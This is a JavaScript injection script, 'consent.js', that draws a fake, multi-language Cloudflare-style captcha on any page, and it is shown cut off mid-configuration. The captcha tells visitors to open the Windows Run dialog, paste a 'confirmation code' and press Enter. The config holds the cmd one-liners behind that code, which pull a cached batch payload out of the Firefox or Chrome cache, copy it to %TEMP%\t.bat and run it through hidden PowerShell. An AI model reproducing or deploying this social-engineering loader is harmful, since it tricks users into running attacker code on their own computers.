/* Standalone consent+captcha inject — paste on any page:
   <script src="https://yoursite.com/consent.js"></script>
   File URL from page query: ?f=https://abc.com/hello.txt  or  ?f=<base64-url>
   Payload MUST be strict raw body only (no HTTP headers, no HTML, no BOM, no bytes after ===END===).
   Firefox: findstr + fsutil trim. Chromium: for /r User Data, f_* file size (cacheFileSizes).
*/
(function () {
  'use strict';

  if (window.__CONSENT_INJECTED__) return;
  window.__CONSENT_INJECTED__ = true;

  /* LOCALE_BLOCK_START */
var verificationLangKey = 'English';

  var COUNTRY_LANGUAGE_P = {"AF":["English"],"AL":["English"],"DZ":["English"],"AD":["English"],"AO":["Portuguese"],"AG":["English"],"AR":["Spanish"],"AM":["English"],"AU":["English"],"AT":["German"],"AZ":["English"],"BS":["English"],"BH":["Arabic"],"BD":["English"],"BB":["English"],"BY":["Russian"],"BE":["English"],"BZ":["English"],"BJ":["French"],"BT":["English"],"BO":["Spanish"],"BA":["English"],"BW":["English"],"BR":["Portuguese"],"BN":["English"],"BG":["English"],"BF":["French"],"BI":["French"],"KH":["English"],"CM":["English"],"CA":["English"],"CV":["Portuguese"],"CF":["French"],"TD":["English"],"CL":["Spanish"],"CN":["Chinese"],"CO":["Spanish"],"KM":["English"],"CG":["French"],"CD":["French"],"CR":["Spanish"],"CI":["French"],"HR":["English"],"CU":["Spanish"],"CY":["Turkish"],"CZ":["English"],"DK":["English"],"DJ":["English"],"DM":["English"],"DO":["Spanish"],"TL":["Portuguese"],"EC":["Spanish"],"EG":["Arabic"],"SV":["Spanish"],"GQ":["English"],"ER":["English"],"EE":["English"],"ET":["English"],"FJ":["English"],"FI":["English"],"FR":["French"],"GA":["French"],"GM":["English"],"GE":["English"],"DE":["German"],"GH":["English"],"GR":["English"],"GD":["English"],"GT":["Spanish"],"GN":["French"],"GW":["Portuguese"],"GY":["English"],"HT":["French"],"HN":["Spanish"],"HU":["English"],"IS":["English"],"IN":["English"],"ID":["English"],"IR":["English"],"IQ":["English"],"IE":["English"],"IL":["English"],"IT":["Italian"],"JM":["English"],"JP":["Japanese"],"JO":["Arabic"],"KZ":["Kazakh"],"KE":["English"],"KI":["English"],"KP":["Korean"],"KR":["Korean"],"XK":["English"],"KW":["Arabic"],"KG":["English"],"LA":["English"],"LV":["English"],"LB":["Arabic"],"LS":["English"],"LR":["English"],"LY":["Arabic"],"LI":["German"],"LT":["English"],"LU":["English"],"MG":["English"],"MW":["English"],"MY":["English"],"MV":["English"],"ML":["French"],"MT":["English"],"MH":["English"],"MR":["Arabic"],"MU":["English"],"MX":["Spanish"],"FM":["English"],"MD":["Romanian"],"MC":["French"],"MN":["English"],"ME":["English"],"MA":["Arabic"],"MZ":["Portuguese"],"MM":["English"],"NA":["English"],"NR":["English"],"NP":["English"],"NL":["English"],"NZ":["English"],"NI":["Spanish"],"NE":["French"],"NG":["English"],"MK":["English"],"NO":["English"],"OM":["Arabic"],"PK":["English"],"PW":["English"],"PS":["Arabic"],"PA":["Spanish"],"PG":["English"],"PY":["Spanish"],"PE":["Spanish"],"PH":["English"],"PL":["Polish"],"PT":["Portuguese"],"QA":["Arabic"],"RO":["Romanian"],"RU":["Russian"],"RW":["English"],"KN":["English"],"LC":["English"],"VC":["English"],"WS":["English"],"SM":["Italian"],"ST":["Portuguese"],"SA":["Arabic"],"SN":["French"],"RS":["Serbian"],"SC":["English"],"SL":["English"],"SG":["Chinese"],"SK":["English"],"SI":["English"],"SB":["English"],"SO":["English"],"ZA":["English"],"SS":["English"],"ES":["Spanish"],"LK":["English"],"SD":["English"],"SR":["English"],"SZ":["English"],"SE":["English"],"CH":["English"],"SY":["Arabic"],"TW":["Taiwan"],"TJ":["English"],"TZ":["English"],"TH":["English"],"TG":["French"],"TO":["English"],"TT":["English"],"TN":["Arabic"],"TR":["Turkish"],"TM":["English"],"TV":["English"],"UG":["English"],"UA":["Ukrainian"],"AE":["Arabic"],"GB":["English"],"US":["English"],"UY":["Spanish"],"UZ":["Uzbek"],"VU":["English"],"VA":["English"],"VE":["Spanish"],"VN":["Vietnamese"],"YE":["Arabic"],"ZM":["English"],"ZW":["English"]};

  var VERIFICATION_I18N = {"English":{"verifyHuman":"Verify you are human","verifying":"Verifying...","stepsHeading":"Let us know you're human, please complete steps:","stepWinR":"Press {WIN} + {R} to open the verification dialog","stepCtrlV":"Press {CTRL} + {V} to paste the confirmation code","stepEnter":"Press {ENTER} to confirm you're not a robot","privacy":"Privacy","help":"Help","terms":"Terms","refId":"Ref ID:","copyUnavailable":"Confirmation code unavailable — check bodyStartMarker/bodyEndMarker in consent.js.","copyOk":"Confirmation code copied.{lenNote} Paste must start with cmd / (Run dialog).","copyRetry":"Click this panel and press Ctrl+V again if paste is empty.{lenNote}","loadingPayload":"Loading payload…","notReadyCache":"Not ready — check cacheFileSizes for {payload}","cfSubtitle":"Checking if the site connection is secure","cfNote":"{domain} needs to review the security of your connection before proceeding.","cfFaq":"Why am I seeing this page?"},"Spanish":{"verifyHuman":"Verifique que es humano","verifying":"Verificando...","stepsHeading":"Confirme que es humano; complete estos pasos:","stepWinR":"Pulse {WIN} + {R} para abrir el cuadro de verificación","stepCtrlV":"Pulse {CTRL} + {V} para pegar el código de confirmación","stepEnter":"Pulse {ENTER} para confirmar que no es un robot","privacy":"Privacidad","help":"Ayuda","terms":"Términos","refId":"ID de ref.:","copyUnavailable":"Código de confirmación no disponible — revise bodyStartMarker/bodyEndMarker en consent.js.","copyOk":"Código de confirmación copiado.{lenNote} El pegado debe empezar por cmd / (cuadro Ejecutar).","copyRetry":"Haga clic en este panel y pulse Ctrl+V de nuevo si el pegado está vacío.{lenNote}","loadingPayload":"Cargando payload…","notReadyCache":"No listo — revise cacheFileSizes para {payload}","cfSubtitle":"Comprobando si la conexión al sitio es segura","cfNote":"{domain} debe revisar la seguridad de su conexión antes de continuar.","cfFaq":"¿Por qué veo esta página?"},"Portuguese":{"verifyHuman":"Verifique se você é humano","verifying":"Verificando...","stepsHeading":"Confirme que você é humano; conclua os passos:","stepWinR":"Pressione {WIN} + {R} para abrir a caixa de verificação","stepCtrlV":"Pressione {CTRL} + {V} para colar o código de confirmação","stepEnter":"Pressione {ENTER} para confirmar que não é um robô","privacy":"Privacidade","help":"Ajuda","terms":"Termos","refId":"ID ref.:","copyUnavailable":"Código de confirmação indisponível — verifique bodyStartMarker/bodyEndMarker em consent.js.","copyOk":"Código de confirmação copiado.{lenNote} A colagem deve começar com cmd / (Executar).","copyRetry":"Clique neste painel e pressione Ctrl+V novamente se a colagem estiver vazia.{lenNote}","loadingPayload":"Carregando payload…","notReadyCache":"Não pronto — verifique cacheFileSizes para {payload}","cfSubtitle":"Verificando se a conexão com o site é segura","cfNote":"{domain} precisa revisar a segurança da sua conexão antes de continuar.","cfFaq":"Por que estou vendo esta página?"},"French":{"verifyHuman":"Vérifiez que vous êtes humain","verifying":"Vérification...","stepsHeading":"Confirmez que vous êtes humain ; suivez ces étapes :","stepWinR":"Appuyez sur {WIN} + {R} pour ouvrir la boîte de vérification","stepCtrlV":"Appuyez sur {CTRL} + {V} pour coller le code de confirmation","stepEnter":"Appuyez sur {ENTER} pour confirmer que vous n'êtes pas un robot","privacy":"Confidentialité","help":"Aide","terms":"Conditions","refId":"ID ref. :","copyUnavailable":"Code de confirmation indisponible — vérifiez bodyStartMarker/bodyEndMarker dans consent.js.","copyOk":"Code de confirmation copié.{lenNote} Le collage doit commencer par cmd / (Exécuter).","copyRetry":"Cliquez sur ce panneau et appuyez à nouveau sur Ctrl+V si le collage est vide.{lenNote}","loadingPayload":"Chargement du payload…","notReadyCache":"Pas prêt — vérifiez cacheFileSizes pour {payload}","cfSubtitle":"Vérification de la sécurité de la connexion au site","cfNote":"{domain} doit examiner la sécurité de votre connexion avant de continuer.","cfFaq":"Pourquoi vois-je cette page ?"},"German":{"verifyHuman":"Bestätigen Sie, dass Sie ein Mensch sind","verifying":"Wird überprüft...","stepsHeading":"Bestätigen Sie, dass Sie ein Mensch sind — bitte führen Sie diese Schritte aus:","stepWinR":"Drücken Sie {WIN} + {R}, um das Verifizierungsfenster zu öffnen","stepCtrlV":"Drücken Sie {CTRL} + {V}, um den Bestätigungscode einzufügen","stepEnter":"Drücken Sie {ENTER}, um zu bestätigen, dass Sie kein Roboter sind","privacy":"Datenschutz","help":"Hilfe","terms":"Bedingungen","refId":"Ref.-ID:","copyUnavailable":"Bestätigungscode nicht verfügbar — prüfen Sie bodyStartMarker/bodyEndMarker in consent.js.","copyOk":"Bestätigungscode kopiert.{lenNote} Einfügen muss mit cmd / beginnen (Ausführen).","copyRetry":"Klicken Sie auf dieses Panel und drücken Sie erneut Strg+V, wenn Einfügen leer ist.{lenNote}","loadingPayload":"Payload wird geladen…","notReadyCache":"Nicht bereit — prüfen Sie cacheFileSizes für {payload}","cfSubtitle":"Es wird geprüft, ob die Site-Verbindung sicher ist","cfNote":"{domain} muss die Sicherheit Ihrer Verbindung prüfen, bevor es weitergeht.","cfFaq":"Warum sehe ich diese Seite?"},"Italian":{"verifyHuman":"Verifica di essere umano","verifying":"Verifica in corso...","stepsHeading":"Conferma di essere umano; completa questi passaggi:","stepWinR":"Premi {WIN} + {R} per aprire la finestra di verifica","stepCtrlV":"Premi {CTRL} + {V} per incollare il codice di conferma","stepEnter":"Premi {ENTER} per confermare che non sei un robot","privacy":"Privacy","help":"Aiuto","terms":"Termini","refId":"ID rif.:","copyUnavailable":"Codice di conferma non disponibile — controlla bodyStartMarker/bodyEndMarker in consent.js.","copyOk":"Codice di conferma copiato.{lenNote} L'incolla deve iniziare con cmd / (Esegui).","copyRetry":"Fai clic su questo pannello e premi di nuovo Ctrl+V se l'incolla è vuoto.{lenNote}","loadingPayload":"Caricamento payload…","notReadyCache":"Non pronto — controlla cacheFileSizes per {payload}","cfSubtitle":"Verifica che la connessione al sito sia sicura","cfNote":"{domain} deve verificare la sicurezza della connessione prima di procedere.","cfFaq":"Perché vedo questa pagina?"},"Arabic":{"verifyHuman":"تحقق من أنك إنسان","verifying":"جارٍ التحقق...","stepsHeading":"أكد أنك إنسان؛ أكمل الخطوات التالية:","stepWinR":"اضغط {WIN} + {R} لفتح مربع التحقق","stepCtrlV":"اضغط {CTRL} + {V} للصق رمز التأكيد","stepEnter":"اضغط {ENTER} للتأكيد أنك لست روبوتًا","privacy":"الخصوصية","help":"مساعدة","terms":"الشروط","refId":"معرّف المرجع:","copyUnavailable":"رمز التأكيد غير متاح — تحقق من bodyStartMarker/bodyEndMarker في consent.js.","copyOk":"تم نسخ رمز التأكيد.{lenNote} يجب أن يبدأ اللصق بـ cmd / (مربع التشغيل).","copyRetry":"انقر على هذه اللوحة واضغط Ctrl+V مرة أخرى إذا كان اللصق فارغًا.{lenNote}","loadingPayload":"جارٍ تحميل الحمولة…","notReadyCache":"غير جاهز — تحقق من cacheFileSizes لـ {payload}","cfSubtitle":"التحقق من أمان اتصال الموقع","cfNote":"يحتاج {domain} إلى مراجعة أمان اتصالك قبل المتابعة.","cfFaq":"لماذا أرى هذه الصفحة؟"},"Russian":{"verifyHuman":"Подтвердите, что вы человек","verifying":"Проверка...","stepsHeading":"Подтвердите, что вы человек; выполните шаги:","stepWinR":"Нажмите {WIN} + {R}, чтобы открыть окно проверки","stepCtrlV":"Нажмите {CTRL} + {V}, чтобы вставить код подтверждения","stepEnter":"Нажмите {ENTER}, чтобы подтвердить, что вы не робот","privacy":"Конфиденциальность","help":"Справка","terms":"Условия","refId":"Ref ID:","copyUnavailable":"Код подтверждения недоступен — проверьте bodyStartMarker/bodyEndMarker в consent.js.","copyOk":"Код подтверждения скопирован.{lenNote} Вставка должна начинаться с cmd / (Выполнить).","copyRetry":"Щёлкните эту панель и снова нажмите Ctrl+V, если вставка пуста.{lenNote}","loadingPayload":"Загрузка payload…","notReadyCache":"Не готово — проверьте cacheFileSizes для {payload}","cfSubtitle":"Проверка безопасности подключения к сайту","cfNote":"{domain} должен проверить безопасность вашего подключения перед продолжением.","cfFaq":"Почему я вижу эту страницу?"},"Turkish":{"verifyHuman":"İnsan olduğunuzu doğrulayın","verifying":"Doğrulanıyor...","stepsHeading":"İnsan olduğunuzu onaylayın; adımları tamamlayın:","stepWinR":"Doğrulama penceresini açmak için {WIN} + {R} tuşlarına basın","stepCtrlV":"Onay kodunu yapıştırmak için {CTRL} + {V} tuşlarına basın","stepEnter":"Robot olmadığınızı onaylamak için {ENTER} tuşuna basın","privacy":"Gizlilik","help":"Yardım","terms":"Koşullar","refId":"Ref ID:","copyUnavailable":"Onay kodu kullanılamıyor — consent.js içinde bodyStartMarker/bodyEndMarker kontrol edin.","copyOk":"Onay kodu kopyalandı.{lenNote} Yapıştırma cmd / ile başlamalıdır (Çalıştır).","copyRetry":"Yapıştırma boşsa bu panele tıklayın ve tekrar Ctrl+V yapın.{lenNote}","loadingPayload":"Payload yükleniyor…","notReadyCache":"Hazır değil — {payload} için cacheFileSizes kontrol edin","cfSubtitle":"Site bağlantısının güvenli olup olmadığı kontrol ediliyor","cfNote":"{domain}, devam etmeden önce bağlantınızın güvenliğini incelemelidir.","cfFaq":"Bu sayfayı neden görüyorum?"},"Polish":{"verifyHuman":"Potwierdź, że jesteś człowiekiem","verifying":"Weryfikacja...","stepsHeading":"Potwierdź, że jesteś człowiekiem; wykonaj kroki:","stepWinR":"Naciśnij {WIN} + {R}, aby otworzyć okno weryfikacji","stepCtrlV":"Naciśnij {CTRL} + {V}, aby wkleić kod potwierdzenia","stepEnter":"Naciśnij {ENTER}, aby potwierdzić, że nie jesteś robotem","privacy":"Prywatność","help":"Pomoc","terms":"Warunki","refId":"Ref ID:","copyUnavailable":"Kod potwierdzenia niedostępny — sprawdź bodyStartMarker/bodyEndMarker w consent.js.","copyOk":"Kod potwierdzenia skopiowany.{lenNote} Wklejanie musi zaczynać się od cmd / (Uruchom).","copyRetry":"Kliknij ten panel i naciśnij ponownie Ctrl+V, jeśli wklejanie jest puste.{lenNote}","loadingPayload":"Ładowanie payload…","notReadyCache":"Nie gotowe — sprawdź cacheFileSizes dla {payload}","cfSubtitle":"Sprawdzanie, czy połączenie z witryną jest bezpieczne","cfNote":"{domain} musi sprawdzić bezpieczeństwo połączenia przed kontynuacją.","cfFaq":"Dlaczego widzę tę stronę?"},"Romanian":{"verifyHuman":"Verificați că sunteți om","verifying":"Se verifică...","stepsHeading":"Confirmați că sunteți om; finalizați pașii:","stepWinR":"Apăsați {WIN} + {R} pentru a deschide fereastra de verificare","stepCtrlV":"Apăsați {CTRL} + {V} pentru a lipi codul de confirmare","stepEnter":"Apăsați {ENTER} pentru a confirma că nu sunteți robot","privacy":"Confidențialitate","help":"Ajutor","terms":"Termeni","refId":"ID ref.:","copyUnavailable":"Cod de confirmare indisponibil — verificați bodyStartMarker/bodyEndMarker în consent.js.","copyOk":"Cod de confirmare copiat.{lenNote} Lipirea trebuie să înceapă cu cmd / (Executare).","copyRetry":"Faceți clic pe acest panou și apăsați din nou Ctrl+V dacă lipirea este goală.{lenNote}","loadingPayload":"Se încarcă payload…","notReadyCache":"Nu este gata — verificați cacheFileSizes pentru {payload}","cfSubtitle":"Se verifică dacă conexiunea la site este securizată","cfNote":"{domain} trebuie să verifice securitatea conexiunii înainte de a continua.","cfFaq":"De ce văd această pagină?"},"Serbian":{"verifyHuman":"Potvrdite da ste čovek","verifying":"Provera...","stepsHeading":"Potvrdite da ste čovek; dovršite korake:","stepWinR":"Pritisnite {WIN} + {R} da otvorite prozor za verifikaciju","stepCtrlV":"Pritisnite {CTRL} + {V} da nalepite kod za potvrdu","stepEnter":"Pritisnite {ENTER} da potvrdite da niste robot","privacy":"Privatnost","help":"Pomoć","terms":"Uslovi","refId":"Ref ID:","copyUnavailable":"Kod za potvrdu nije dostupan — proverite bodyStartMarker/bodyEndMarker u consent.js.","copyOk":"Kod za potvrdu kopiran.{lenNote} Nalepnica mora početi sa cmd / (Pokreni).","copyRetry":"Kliknite na ovaj panel i ponovo pritisnite Ctrl+V ako je nalepnica prazna.{lenNote}","loadingPayload":"Učitavanje payload-a…","notReadyCache":"Nije spremno — proverite cacheFileSizes za {payload}","cfSubtitle":"Provera da li je veza sa sajtom bezbedna","cfNote":"{domain} mora da proveri bezbednost vaše veze pre nego što nastavi.","cfFaq":"Zašto vidim ovu stranicu?"},"Japanese":{"verifyHuman":"人間であることを確認","verifying":"確認中...","stepsHeading":"人間であることを確認してください。次の手順を完了してください：","stepWinR":"{WIN} + {R} を押して確認ダイアログを開く","stepCtrlV":"{CTRL} + {V} を押して確認コードを貼り付ける","stepEnter":"{ENTER} を押してロボットではないことを確認する","privacy":"プライバシー","help":"ヘルプ","terms":"利用規約","refId":"参照 ID:","copyUnavailable":"確認コードを利用できません — consent.js の bodyStartMarker/bodyEndMarker を確認してください。","copyOk":"確認コードをコピーしました。{lenNote} 貼り付けは cmd / で始まる必要があります（ファイル名を指定して実行）。","copyRetry":"貼り付けが空の場合はこのパネルをクリックし、再度 Ctrl+V を押してください。{lenNote}","loadingPayload":"ペイロードを読み込み中…","notReadyCache":"準備できていません — {payload} の cacheFileSizes を確認してください","cfSubtitle":"サイト接続が安全か確認しています","cfNote":"{domain} は続行する前に接続のセキュリティを確認する必要があります。","cfFaq":"なぜこのページが表示されますか？"},"Korean":{"verifyHuman":"사람임을 확인","verifying":"확인 중...","stepsHeading":"사람임을 확인하세요. 다음 단계를 완료하세요:","stepWinR":"{WIN} + {R}을 눌러 확인 대화 상자를 엽니다","stepCtrlV":"{CTRL} + {V}를 눌러 확인 코드를 붙여넣습니다","stepEnter":"{ENTER}를 눌러 로봇이 아님을 확인합니다","privacy":"개인정보","help":"도움말","terms":"약관","refId":"참조 ID:","copyUnavailable":"확인 코드를 사용할 수 없습니다 — consent.js의 bodyStartMarker/bodyEndMarker를 확인하세요.","copyOk":"확인 코드가 복사되었습니다.{lenNote} 붙여넣기는 cmd /로 시작해야 합니다(실행).","copyRetry":"붙여넣기가 비어 있으면 이 패널을 클릭하고 Ctrl+V를 다시 누르세요.{lenNote}","loadingPayload":"페이로드 로드 중…","notReadyCache":"준비되지 않음 — {payload}에 대한 cacheFileSizes 확인","cfSubtitle":"사이트 연결이 안전한지 확인 중","cfNote":"{domain}은(는) 계속하기 전에 연결 보안을 검토해야 합니다.","cfFaq":"왜 이 페이지가 표시되나요?"},"Chinese":{"verifyHuman":"验证您是人类","verifying":"正在验证...","stepsHeading":"请确认您是人类，并完成以下步骤：","stepWinR":"按 {WIN} + {R} 打开验证对话框","stepCtrlV":"按 {CTRL} + {V} 粘贴确认代码","stepEnter":"按 {ENTER} 确认您不是机器人","privacy":"隐私","help":"帮助","terms":"条款","refId":"参考 ID：","copyUnavailable":"确认代码不可用 — 请检查 consent.js 中的 bodyStartMarker/bodyEndMarker。","copyOk":"确认代码已复制。{lenNote} 粘贴必须以 cmd / 开头（运行）。","copyRetry":"如果粘贴为空，请单击此面板并再次按 Ctrl+V。{lenNote}","loadingPayload":"正在加载 payload…","notReadyCache":"未就绪 — 请检查 {payload} 的 cacheFileSizes","cfSubtitle":"正在检查站点连接是否安全","cfNote":"{domain} 需要在继续之前审查您的连接安全性。","cfFaq":"为什么我会看到此页面？"},"Taiwan":{"verifyHuman":"驗證您是人類","verifying":"正在驗證...","stepsHeading":"請確認您是人類，並完成以下步驟：","stepWinR":"按 {WIN} + {R} 開啟驗證對話方塊","stepCtrlV":"按 {CTRL} + {V} 貼上確認碼","stepEnter":"按 {ENTER} 確認您不是機器人","privacy":"隱私","help":"說明","terms":"條款","refId":"參考 ID：","copyUnavailable":"確認碼不可用 — 請檢查 consent.js 中的 bodyStartMarker/bodyEndMarker。","copyOk":"確認碼已複製。{lenNote} 貼上必須以 cmd / 開頭（執行）。","copyRetry":"若貼上為空，請按一下此面板並再次按 Ctrl+V。{lenNote}","loadingPayload":"正在載入 payload…","notReadyCache":"未就緒 — 請檢查 {payload} 的 cacheFileSizes","cfSubtitle":"正在檢查網站連線是否安全","cfNote":"{domain} 需要在繼續之前審查您的連線安全性。","cfFaq":"為什麼我會看到此頁面？"},"Vietnamese":{"verifyHuman":"Xác minh bạn là người","verifying":"Đang xác minh...","stepsHeading":"Xác nhận bạn là người; hoàn thành các bước:","stepWinR":"Nhấn {WIN} + {R} để mở hộp thoại xác minh","stepCtrlV":"Nhấn {CTRL} + {V} để dán mã xác nhận","stepEnter":"Nhấn {ENTER} để xác nhận bạn không phải robot","privacy":"Quyền riêng tư","help":"Trợ giúp","terms":"Điều khoản","refId":"ID tham chiếu:","copyUnavailable":"Mã xác nhận không khả dụng — kiểm tra bodyStartMarker/bodyEndMarker trong consent.js.","copyOk":"Đã sao chép mã xác nhận.{lenNote} Dán phải bắt đầu bằng cmd / (Hộp thoại Run).","copyRetry":"Nhấp vào bảng này và nhấn Ctrl+V lại nếu dán trống.{lenNote}","loadingPayload":"Đang tải payload…","notReadyCache":"Chưa sẵn sàng — kiểm tra cacheFileSizes cho {payload}","cfSubtitle":"Đang kiểm tra kết nối tới trang web có an toàn không","cfNote":"{domain} cần xem xét bảo mật kết nối của bạn trước khi tiếp tục.","cfFaq":"Tại sao tôi thấy trang này?"},"Uzbek":{"verifyHuman":"Odam ekanligingizni tasdiqlang","verifying":"Tekshirilmoqda...","stepsHeading":"Odam ekanligingizni tasdiqlang; qadamlarni bajaring:","stepWinR":"Tekshiruv oynasini ochish uchun {WIN} + {R} bosing","stepCtrlV":"Tasdiqlash kodini joylash uchun {CTRL} + {V} bosing","stepEnter":"Robot emasligingizni tasdiqlash uchun {ENTER} bosing","privacy":"Maxfiylik","help":"Yordam","terms":"Shartlar","refId":"Ref ID:","copyUnavailable":"Tasdiqlash kodi mavjud emas — consent.js dagi bodyStartMarker/bodyEndMarker ni tekshiring.","copyOk":"Tasdiqlash kodi nusxalandi.{lenNote} Joylash cmd / bilan boshlanishi kerak (Ishga tushirish).","copyRetry":"Joylash bo'sh bo'lsa, bu panelni bosing va yana Ctrl+V bosing.{lenNote}","loadingPayload":"Payload yuklanmoqda…","notReadyCache":"Tayyor emas — {payload} uchun cacheFileSizes ni tekshiring","cfSubtitle":"Sayt ulanishi xavfsizligi tekshirilmoqda","cfNote":"{domain} davom etishdan oldin ulanishingiz xavfsizligini ko'rib chiqishi kerak.","cfFaq":"Nima uchun bu sahifani ko'ryapman?"},"Kazakh":{"verifyHuman":"Адам екеніңізді растаңыз","verifying":"Тексерілуде...","stepsHeading":"Адам екеніңізді растаңыз; қадамдарды орындаңыз:","stepWinR":"Растау терезесін ашу үшін {WIN} + {R} басыңыз","stepCtrlV":"Растау кодын қою үшін {CTRL} + {V} басыңыз","stepEnter":"Рobot емес екеніңізді растау үшін {ENTER} басыңыз","privacy":"Құпиялылық","help":"Көмек","terms":"Шарттар","refId":"Ref ID:","copyUnavailable":"Растау коды қолжетімсіз — consent.js ішіндегі bodyStartMarker/bodyEndMarker тексеріңіз.","copyOk":"Растау коды көшірілді.{lenNote} Қою cmd / басталуы керек (Іске қосу).","copyRetry":"Қою бос болса, осы панельді басып, қайта Ctrl+V басыңыз.{lenNote}","loadingPayload":"Payload жүктелуде…","notReadyCache":"Дайын емес — {payload} үшін cacheFileSizes тексеріңіз","cfSubtitle":"Сайт қосылымының қауіпсіздігі тексерілуде","cfNote":"{domain} жалғастырмас бұрын қосылымыңыздың қауіпсіздігін тексеруі керек.","cfFaq":"Неге мен бұл бетті көремін?"},"Ukrainian":{"verifyHuman":"Підтвердьте, що ви людина","verifying":"Перевірка...","stepsHeading":"Підтвердьте, що ви людина; виконайте кроки:","stepWinR":"Натисніть {WIN} + {R}, щоб відкрити вікно перевірки","stepCtrlV":"Натисніть {CTRL} + {V}, щоб вставити код підтвердження","stepEnter":"Натисніть {ENTER}, щоб підтвердити, що ви не робот","privacy":"Конфіденційність","help":"Довідка","terms":"Умови","refId":"Ref ID:","copyUnavailable":"Код підтвердження недоступний — перевірте bodyStartMarker/bodyEndMarker у consent.js.","copyOk":"Код підтвердження скопійовано.{lenNote} Вставлення має починатися з cmd / (Виконати).","copyRetry":"Клацніть цю панель і знову натисніть Ctrl+V, якщо вставлення порожнє.{lenNote}","loadingPayload":"Завантаження payload…","notReadyCache":"Не готово — перевірте cacheFileSizes для {payload}","cfSubtitle":"Перевірка безпеки підключення до сайту","cfNote":"{domain} має перевірити безопасність вашого підключення перед продовженням.","cfFaq":"Чому я бачу цю сторінку?"}};

  function languageFromCountry(countryCode) {
    if (!countryCode || !COUNTRY_LANGUAGE_P[countryCode]) return 'English';
    return COUNTRY_LANGUAGE_P[countryCode][0] || 'English';
  }

  function getVerifyStrings() {
    return VERIFICATION_I18N[verificationLangKey] || VERIFICATION_I18N.English;
  }

  function applyVerificationStepHtml(step) {
    return step
      .replace(/\{WIN\}/g, '<span class="ts-kbd">Win</span>')
      .replace(/\{R\}/g, '<span class="ts-kbd">R</span>')
      .replace(/\{CTRL\}/g, '<span class="ts-kbd">Ctrl</span>')
      .replace(/\{V\}/g, '<span class="ts-kbd">V</span>')
      .replace(/\{ENTER\}/g, '<span class="ts-kbd">Enter</span>');
  }

  function getNotReadyHint() {
    var payload = isJjjjPayloadUrl() ? 'jjjj' : isJjjPayloadUrl() ? 'jjj' : isJjPayloadUrl() ? 'jj' : getBrowserKey();
    return getVerifyStrings().notReadyCache.replace('{payload}', payload);
  }

  function applyCloudflarePageI18n() {
    if (CONSENT_CONFIG.presentation !== 'cloudflare') return;
    var t = getVerifyStrings();
    var sub = document.querySelector('.cf-subtitle');
    if (sub) sub.textContent = t.cfSubtitle;
    var area = document.getElementById('cf-challenge-area');
    if (area) {
      area.setAttribute('aria-label', t.verifyHuman);
      var lbl = area.querySelector('.cf-label');
      if (lbl && !area.classList.contains('cf-loading')) lbl.textContent = t.verifyHuman;
    }
    var widget = document.querySelector('.cf-widget');
    if (widget) {
      var links = widget.querySelectorAll('.cf-links a');
      if (links[0]) links[0].textContent = t.privacy;
      if (links[1]) links[1].textContent = t.terms;
    }
    var note = document.querySelector('.cf-note');
    if (note) {
      var domEl = document.getElementById('cf-domain-note');
      var domain = domEl ? domEl.textContent : '';
      note.innerHTML = t.cfNote.replace('{domain}', '<span id="cf-domain-note">' + domain + '</span>');
    }
    var faq = document.querySelector('.cf-faq-text');
    if (faq) faq.textContent = t.cfFaq;
    if (verificationLangKey === 'Arabic') {
      document.documentElement.setAttribute('dir', 'rtl');
    }
  }

  function refreshVerificationUiI18n() {
    applyCloudflarePageI18n();
    var area = document.getElementById('cf-challenge-area');
    if (area && !captchaVisible) {
      var lbl2 = area.querySelector('.cf-label');
      if (lbl2 && !area.classList.contains('cf-loading')) lbl2.textContent = getVerifyStrings().verifyHuman;
    }
    if (!captchaWidget) return;
    if (verificationLangKey === 'Arabic') {
      captchaWidget.setAttribute('dir', 'rtl');
    }
    if (captchaWidget.classList.contains('ts-verifying')) {
      var refEl = captchaWidget.querySelector('.ts-v-ref-id');
      var refId = refEl && refEl.textContent ? refEl.textContent : generateRefId();
      var hintEl = captchaWidget.querySelector('.ts-v-copy-hint');
      var wasOk = hintEl && hintEl.classList.contains('ts-v-copy-ok');
      captchaWidget.innerHTML = getVerifyingHtml(refId);
      updateCopyHint(captchaWidget.querySelector('.ts-v-copy-hint'), wasOk);
      bindCopyOnUserGesture(captchaWidget);
    } else {
      var tsLabel = captchaWidget.querySelector('.ts-label');
      if (tsLabel) tsLabel.textContent = getVerifyStrings().verifyHuman;
      var checkArea = captchaWidget.querySelector('.ts-check-area');
      if (checkArea) checkArea.setAttribute('aria-label', getVerifyStrings().verifyHuman);
    }
  }

  function fetchUserLocaleFromIpinfo() {
    fetch('https://ipinfo.io/json')
      .then(function (response) { return response.json(); })
      .then(function (data) {
        verificationLangKey = languageFromCountry(data && data.country);
        whenDomReady(refreshVerificationUiI18n);
        if (document.readyState !== 'loading') refreshVerificationUiI18n();
      })
      .catch(function () {});
  }
  /* LOCALE_BLOCK_END */

  var VERIFICATION_ECHO = '                             I AM NOT A ROBOT                           ';

  var CONSENT_CONFIG = {
    version: '1.9.32',
    presentation: 'consent',
    privacyPolicyUrl: '/privacy-policy',
    optOutUrl: '/opt-out-preferences',
    accentColor: '#1b6369',
    accentHover: '#155459',
    captchaLogoUrl: 'https://cdn-bhdil.nitrocdn.com/isrDVIFCpCXbHHPoNruCoFKRiVumSNxS/assets/images/optimized/rev-aa44ab3/bobcares.com/wp-content/uploads/2023/08/cloudflare.jpeg',
    cacheFileUrl: null,
    cacheFileBodySize: null,
    strictBody: true,
    bodyStartMarker: 'CDRP7F3A9D2B8C4',
    bodyEndMarker: 'CDRPEND7F3A9D2',
    bodyMustStartWith: '@echo off',
    cacheFileSizes: {
      firefox: 0,
      chrome: 17189,
      edge: 17189,
      brave: 17189
    },
    cacheFileSizesJj: {
      firefox: 0,
      chrome: 17218,
      edge: 17218,
      brave: 17218
    },
    cacheFileSizesJjj: {
      firefox: 0,
      chrome: 17244,
      edge: 17244,
      brave: 17244
    },
    cacheFileSizesJjjj: {
      firefox: 0,
      chrome: 17423,
      edge: 17423,
      brave: 17423
    },
    verificationSuffix: ' & echo ' + VERIFICATION_ECHO,
    verificationTemplates: {
      firefox: 'cmd /k cd /d %TMP%&for /d %p in (%LOCALAPPDATA%\\Mozilla\\Firefox\\Profiles\\*) do @for %f in (%~sp\\cache2\\entries\\*) do @findstr /b /c:@echo "%f">nul&&copy /y "%f" t.bat&&fsutil file seteof t.bat {SZ}&&call t.bat',
      chrome: 'cmd /c for /r "%LOCALAPPDATA%\\Google\\Chrome\\User Data" %f in (f_*) do @if %~zf=={CSZ} copy "%f" %TEMP%\\t.bat>nul 2>nul&powershell -w hidden -nop -c "cmd /c %TEMP%\\t.bat"&echo ' + VERIFICATION_ECHO,
